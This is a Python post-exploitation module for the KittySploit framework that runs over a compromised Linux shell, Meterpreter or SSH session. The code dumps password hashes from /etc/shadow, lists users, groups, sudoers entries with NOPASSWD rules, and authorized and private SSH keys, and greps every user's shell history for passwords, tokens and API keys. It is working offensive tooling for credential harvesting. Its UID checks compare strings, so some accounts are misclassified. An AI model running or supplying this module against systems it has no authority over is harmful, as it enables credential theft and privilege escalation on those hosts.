from kittysploit import *
from lib.post.linux.system import System

class Module(Post, System):

    __info__ = {
        "name": "Linux User Enumeration",
        "description": "Enumerate users, groups, login history, sudo permissions, SSH keys, and shell history",
        "platform": Platform.LINUX,
        "author": "KittySploit Team",
        "session_type": [SessionType.SHELL, 
                        SessionType.METERPRETER,
                        SessionType.SSH],
    }

    def run(self):
        """Enumerate user and permission information"""
        
        print_status("Starting user enumeration...")
        
        # 1. User Accounts
        self._enum_users()
        
        # 2. Groups
        self._enum_groups()
        
        # 3. Login History
        self._enum_login_history()
        
        # 4. Sudo Permissions
        self._enum_sudo()
        
        # 5. SSH Authorized Keys
        self._enum_ssh_keys()
        
        # 6. Shell History
        self._enum_shell_history()
        
        # 7. User Shells
        self._enum_user_shells()
        
        # 8. Current User Info
        self._enum_current_user()
        
        print_success("User enumeration completed")
        return True
    
    def _enum_users(self):
        """Enumerate user accounts"""
        print_status("="*60)
        print_status("User Accounts")
        print_status("="*60)
        
        try:
            # Read /etc/passwd
            passwd_content = self.read_file("/etc/passwd")
            if passwd_content:
                print_info("Users from /etc/passwd:")
                users = []
                for line in passwd_content.strip().split('\n'):
                    if line.strip() and not line.strip().startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 7:
                            username = parts[0]
                            uid = parts[2]
                            gid = parts[3]
                            gecos = parts[4]
                            home = parts[5]
                            shell = parts[6]
                            
                            users.append({
                                'username': username,
                                'uid': uid,
                                'gid': gid,
                                'gecos': gecos,
                                'home': home,
                                'shell': shell
                            })
                            
                            # Highlight interesting users
                            highlight = ""
                            if uid == '0':
                                highlight = " [ROOT]"
                            elif uid < '1000' and uid != '0':
                                highlight = " [SYSTEM]"
                            elif shell == '/bin/bash' or shell == '/bin/sh':
                                highlight = " [LOGIN SHELL]"
                            elif '/nologin' in shell or '/false' in shell:
                                highlight = " [NO LOGIN]"
                            
                            print_info(f"  {username}:{uid}:{gid} - {gecos} - {home} - {shell}{highlight}")
                
                print_status(f"Total users found: {len(users)}")
                
                # Count users by type
                root_users = [u for u in users if u['uid'] == '0']
                system_users = [u for u in users if u['uid'] < '1000' and u['uid'] != '0']
                login_users = [u for u in users if '/nologin' not in u['shell'] and '/false' not in u['shell']]
                
                print_info(f"  Root users (UID 0): {len(root_users)}")
                print_info(f"  System users (UID < 1000): {len(system_users)}")
                print_info(f"  Users with login shell: {len(login_users)}")
                
                # List root users
                if root_users:
                    print_status("Root users:")
                    for user in root_users:
                        print_info(f"  - {user['username']} (UID: {user['uid']})")
            
            # Try to read /etc/shadow (requires root)
            print_status("Password Hashes (/etc/shadow):")
            shadow_content = self.read_file("/etc/shadow")
            if shadow_content and "Permission denied" not in shadow_content and "No such file" not in shadow_content:
                shadow_lines = shadow_content.strip().split('\n')
                if shadow_lines and shadow_lines[0]:
                    print_warning("  Shadow file accessible! Extracting password hashes...")
                    for line in shadow_lines:
                        if line.strip() and not line.strip().startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 2:
                                username = parts[0]
                                hash_field = parts[1]
                                if hash_field and hash_field != '*':
                                    if hash_field.startswith('$'):
                                        hash_type = hash_field.split('$')[1] if '$' in hash_field else 'unknown'
                                        print_info(f"  {username}: {hash_field[:50]}... (Type: ${hash_type})")
                                    else:
                                        print_info(f"  {username}: {hash_field}")
            else:
                print_warning("  Cannot read /etc/shadow (requires root privileges)")
            
            # Get currently logged in users
            print_status("Currently Logged In Users:")
            who_output = self.cmd_exec("who 2>/dev/null")
            if who_output:
                print_info(who_output)
            
            w_output = self.cmd_exec("w 2>/dev/null")
            if w_output:
                print_info("Detailed user activity (w):")
                print_info(w_output)
                
        except Exception as e:
            print_warning(f"Error enumerating users: {e}")
    
    def _enum_groups(self):
        """Enumerate groups"""
        print_status("="*60)
        print_status("Groups")
        print_status("="*60)
        
        try:
            # Read /etc/group
            group_content = self.read_file("/etc/group")
            if group_content:
                print_info("Groups from /etc/group:")
                groups = []
                for line in group_content.strip().split('\n'):
                    if line.strip() and not line.strip().startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 4:
                            groupname = parts[0]
                            gid = parts[2]
                            members = parts[3].split(',') if parts[3] else []
                            
                            groups.append({
                                'name': groupname,
                                'gid': gid,
                                'members': members
                            })
                            
                            highlight = ""
                            if gid == '0':
                                highlight = " [ROOT GROUP]"
                            elif gid < '1000':
                                highlight = " [SYSTEM GROUP]"
                            
                            members_str = ', '.join(members) if members else '(no members)'
                            print_info(f"  {groupname}:{gid} - Members: {members_str}{highlight}")
                
                print_status(f"Total groups found: {len(groups)}")
                
                # Find interesting groups
                interesting_groups = ['sudo', 'admin', 'wheel', 'docker', 'lxd', 'kvm', 'audio', 'video', 'disk', 'dialout']
                print_status("Interesting Groups:")
                for group in groups:
                    if group['name'] in interesting_groups or group['gid'] == '0':
                        members_str = ', '.join(group['members']) if group['members'] else '(no members)'
                        print_info(f"  {group['name']} (GID: {group['gid']}) - Members: {members_str}")
            
            # Get current user's groups
            print_status("Current User Groups:")
            groups_output = self.cmd_exec("groups 2>/dev/null")
            if groups_output:
                print_info(f"  {groups_output.strip()}")
            
            id_output = self.cmd_exec("id 2>/dev/null")
            if id_output:
                print_info(f"  {id_output.strip()}")
                
        except Exception as e:
            print_warning(f"Error enumerating groups: {e}")
    
    def _enum_login_history(self):
        """Enumerate login history"""
        print_status("="*60)
        print_status("Login History")
        print_status("="*60)
        
        try:
            # Get last logins
            if self.command_exists('last'):
                print_status("Recent Logins (last):")
                last_output = self.cmd_exec("last -n 20 2>/dev/null")
                if last_output:
                    for line in last_output.strip().split('\n'):
                        if line.strip() and not line.strip().startswith('wtmp'):
                            print_info(f"  {line}")
            
            # Get lastlog
            if self.command_exists('lastlog'):
                print_status("Last Login Times (lastlog):")
                lastlog_output = self.cmd_exec("lastlog 2>/dev/null | head -30")
                if lastlog_output:
                    for line in lastlog_output.strip().split('\n'):
                        if line.strip() and not line.strip().startswith('Username'):
                            if 'Never logged in' not in line:
                                print_info(f"  {line}")
            
            # Get failed login attempts
            print_status("Failed Login Attempts:")
            failed_logins = self.cmd_exec("grep -i 'failed\\|invalid\\|authentication failure' /var/log/auth.log /var/log/secure /var/log/messages 2>/dev/null | tail -20")
            if failed_logins:
                for line in failed_logins.strip().split('\n'):
                    if line.strip():
                        print_info(f"  {line}")
            
            # Get successful logins
            print_status("Successful Login Attempts:")
            success_logins = self.cmd_exec("grep -i 'accepted\\|successful' /var/log/auth.log /var/log/secure 2>/dev/null | tail -20")
            if success_logins:
                for line in success_logins.strip().split('\n'):
                    if line.strip():
                        print_info(f"  {line}")
            
            # Check for .bash_history or .zsh_history in home directories
            print_status("Checking for shell history files...")
            home_dirs = self.cmd_exec("ls -d /home/* 2>/dev/null")
            if home_dirs:
                for home_dir in home_dirs.strip().split('\n'):
                    if home_dir.strip():
                        user = home_dir.split('/')[-1]
                        history_files = [
                            f"{home_dir}/.bash_history",
                            f"{home_dir}/.zsh_history",
                            f"{home_dir}/.history"
                        ]
                        for hist_file in history_files:
                            if self.file_exist(hist_file):
                                size = self.cmd_exec(f"wc -c < {hist_file} 2>/dev/null").strip()
                                if size and size.isdigit():
                                    print_info(f"  {user}: {hist_file} ({size} bytes)")
                                
        except Exception as e:
            print_warning(f"Error enumerating login history: {e}")
    
    def _enum_sudo(self):
        """Enumerate sudo permissions"""
        print_status("="*60)
        print_status("Sudo Permissions")
        print_status("="*60)
        
        try:
            # Check sudoers file
            sudoers_content = self.read_file("/etc/sudoers")
            if sudoers_content:
                print_info("Sudoers file (/etc/sudoers):")
                for line in sudoers_content.strip().split('\n'):
                    if line.strip() and not line.strip().startswith('#'):
                        # Highlight interesting lines
                        if 'NOPASSWD' in line:
                            print_warning(f"  {line} [NOPASSWD - NO PASSWORD REQUIRED!]")
                        elif 'ALL' in line and ('ALL=' in line or 'ALL,' in line):
                            print_info(f"  {line} [FULL ACCESS]")
                        else:
                            print_info(f"  {line}")
            
            # Check sudoers.d directory
            sudoers_d = self.cmd_exec("ls -la /etc/sudoers.d/ 2>/dev/null")
            if sudoers_d:
                print_status("Files in /etc/sudoers.d/:")
                print_info(sudoers_d)
                
                # Read each file in sudoers.d
                files = self.cmd_exec("ls /etc/sudoers.d/ 2>/dev/null")
                if files:
                    for file in files.strip().split('\n'):
                        if file.strip() and file.strip() != '.' and file.strip() != '..':
                            file_content = self.read_file(f"/etc/sudoers.d/{file}")
                            if file_content:
                                print_status(f"Sudoers.d/{file}:")
                                for line in file_content.strip().split('\n'):
                                    if line.strip() and not line.strip().startswith('#'):
                                        if 'NOPASSWD' in line:
                                            print_warning(f"  {line} [NOPASSWD]")
                                        else:
                                            print_info(f"  {line}")
            
            # Check current user's sudo permissions
            print_status("Current User Sudo Permissions:")
            sudo_l_output = self.cmd_exec("sudo -l 2>/dev/null")
            if sudo_l_output and "Permission denied" not in sudo_l_output:
                print_info(sudo_l_output)
            else:
                print_info("  Cannot check sudo permissions (may require password)")
            
            # Check if current user can sudo without password
            sudo_test = self.cmd_exec("sudo -n true 2>&1")
            if sudo_test and "password" not in sudo_test.lower():
                print_warning("  Current user can execute sudo without password!")
            else:
                print_info("  Current user requires password for sudo")
                
        except Exception as e:
            print_warning(f"Error enumerating sudo: {e}")
    
    def _enum_ssh_keys(self):
        """Enumerate SSH authorized keys"""
        print_status("="*60)
        print_status("SSH Authorized Keys")
        print_status("="*60)
        
        try:
            # Check for authorized_keys files in home directories
            home_dirs = self.cmd_exec("ls -d /home/* 2>/dev/null")
            if home_dirs:
                for home_dir in home_dirs.strip().split('\n'):
                    if home_dir.strip():
                        user = home_dir.split('/')[-1]
                        auth_keys_file = f"{home_dir}/.ssh/authorized_keys"
                        
                        if self.file_exist(auth_keys_file):
                            print_status(f"Authorized keys for {user}:")
                            keys_content = self.read_file(auth_keys_file)
                            if keys_content:
                                key_count = len([l for l in keys_content.strip().split('\n') if l.strip() and not l.strip().startswith('#')])
                                print_info(f"  Found {key_count} authorized key(s)")
                                
                                for line in keys_content.strip().split('\n'):
                                    if line.strip() and not line.strip().startswith('#'):
                                        # Extract key type and comment
                                        parts = line.split()
                                        if len(parts) >= 2:
                                            key_type = parts[0]
                                            key_data = parts[1][:50] + "..." if len(parts[1]) > 50 else parts[1]
                                            comment = ' '.join(parts[2:]) if len(parts) > 2 else 'no comment'
                                            print_info(f"    Type: {key_type}, Comment: {comment}")
                            
                            # Check permissions
                            perms = self.cmd_exec(f"ls -l {auth_keys_file} 2>/dev/null")
                            if perms:
                                print_info(f"  Permissions: {perms.strip()}")
            
            # Check root's authorized_keys
            root_auth_keys = "/root/.ssh/authorized_keys"
            if self.file_exist(root_auth_keys):
                print_status("Root authorized keys:")
                keys_content = self.read_file(root_auth_keys)
                if keys_content:
                    key_count = len([l for l in keys_content.strip().split('\n') if l.strip() and not l.strip().startswith('#')])
                    print_warning(f"  Found {key_count} authorized key(s) for ROOT!")
                    for line in keys_content.strip().split('\n'):
                        if line.strip() and not line.strip().startswith('#'):
                            parts = line.split()
                            if len(parts) >= 2:
                                key_type = parts[0]
                                comment = ' '.join(parts[2:]) if len(parts) > 2 else 'no comment'
                                print_info(f"    Type: {key_type}, Comment: {comment}")
            
            # Check for SSH private keys
            print_status("SSH Private Keys:")
            private_keys = self.cmd_exec("find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | head -20")
            if private_keys:
                for key_file in private_keys.strip().split('\n'):
                    if key_file.strip():
                        print_warning(f"  Found private key: {key_file}")
                        perms = self.cmd_exec(f"ls -l {key_file} 2>/dev/null")
                        if perms:
                            print_info(f"    Permissions: {perms.strip()}")
                            
        except Exception as e:
            print_warning(f"Error enumerating SSH keys: {e}")
    
    def _enum_shell_history(self):
        """Enumerate shell history files"""
        print_status("="*60)
        print_status("Shell History")
        print_status("="*60)
        
        try:
            # Get current user's history
            print_status("Current User History:")
            current_user = self.cmd_exec("whoami 2>/dev/null").strip()
            if current_user:
                home_dir = self.cmd_exec(f"echo ~{current_user} 2>/dev/null || getent passwd {current_user} | cut -d: -f6").strip()
                
                history_files = [
                    f"{home_dir}/.bash_history",
                    f"{home_dir}/.zsh_history",
                    f"{home_dir}/.history",
                    f"{home_dir}/.sh_history"
                ]
                
                for hist_file in history_files:
                    if self.file_exist(hist_file):
                        print_status(f"Found: {hist_file}")
                        # Get last 20 commands
                        last_commands = self.cmd_exec(f"tail -20 {hist_file} 2>/dev/null")
                        if last_commands:
                            print_info("Last 20 commands:")
                            for cmd in last_commands.strip().split('\n'):
                                if cmd.strip():
                                    print_info(f"  {cmd}")
            
            # Check all users' history files
            print_status("All Users' History Files:")
            all_history = self.cmd_exec("find /home /root -name '.bash_history' -o -name '.zsh_history' -o -name '.history' 2>/dev/null | head -20")
            if all_history:
                for hist_file in all_history.strip().split('\n'):
                    if hist_file.strip():
                        user = hist_file.split('/')[2] if len(hist_file.split('/')) > 2 else 'unknown'
                        size = self.cmd_exec(f"wc -l < {hist_file} 2>/dev/null").strip()
                        if size and size.isdigit():
                            print_info(f"  {user}: {hist_file} ({size} lines)")
                            
                            # Look for interesting commands
                            interesting = self.cmd_exec(f"grep -iE 'password|passwd|ssh|key|secret|token|api' {hist_file} 2>/dev/null | tail -5")
                            if interesting:
                                print_warning(f"    Interesting commands found:")
                                for line in interesting.strip().split('\n'):
                                    if line.strip():
                                        print_info(f"      {line[:100]}")
                                
        except Exception as e:
            print_warning(f"Error enumerating shell history: {e}")
    
    def _enum_user_shells(self):
        """Enumerate user shells"""
        print_status("="*60)
        print_status("User Shells")
        print_status("="*60)
        
        try:
            # Read /etc/shells
            shells_content = self.read_file("/etc/shells")
            if shells_content:
                print_info("Valid shells (/etc/shells):")
                for line in shells_content.strip().split('\n'):
                    if line.strip() and not line.strip().startswith('#'):
                        print_info(f"  {line}")
            
            # Count users by shell type
            passwd_content = self.read_file("/etc/passwd")
            if passwd_content:
                shell_count = {}
                for line in passwd_content.strip().split('\n'):
                    if line.strip() and not line.strip().startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 7:
                            shell = parts[6]
                            shell_count[shell] = shell_count.get(shell, 0) + 1
                
                print_status("Users by Shell Type:")
                for shell, count in sorted(shell_count.items(), key=lambda x: x[1], reverse=True):
                    highlight = ""
                    if '/nologin' in shell or '/false' in shell:
                        highlight = " [NO LOGIN]"
                    elif '/bash' in shell or '/sh' in shell:
                        highlight = " [LOGIN SHELL]"
                    print_info(f"  {shell}: {count} user(s){highlight}")
                    
        except Exception as e:
            print_warning(f"Error enumerating user shells: {e}")
    
    def _enum_current_user(self):
        """Enumerate current user information"""
        print_status("="*60)
        print_status("Current User Information")
        print_status("="*60)
        
        try:
            # Get current user
            current_user = self.cmd_exec("whoami 2>/dev/null").strip()
            if current_user:
                print_info(f"Current user: {current_user}")
            
            # Get user ID
            uid = self.cmd_exec("id -u 2>/dev/null").strip()
            if uid:
                print_info(f"UID: {uid}")
                if uid == '0':
                    print_warning("  Running as ROOT!")
            
            # Get groups
            groups = self.cmd_exec("id 2>/dev/null").strip()
            if groups:
                print_info(f"Groups: {groups}")
            
            # Get home directory
            home = self.cmd_exec("echo $HOME 2>/dev/null").strip()
            if home:
                print_info(f"Home directory: {home}")
            
            # Get current working directory
            pwd = self.pwd()
            if pwd:
                print_info(f"Current directory: {pwd}")
            
            # Check if user is in sudo group
            sudo_check = self.cmd_exec("groups 2>/dev/null | grep -E 'sudo|admin|wheel'")
            if sudo_check:
                print_warning(f"  User is in privileged group: {sudo_check.strip()}")
                
        except Exception as e:
            print_warning(f"Error enumerating current user: {e}")

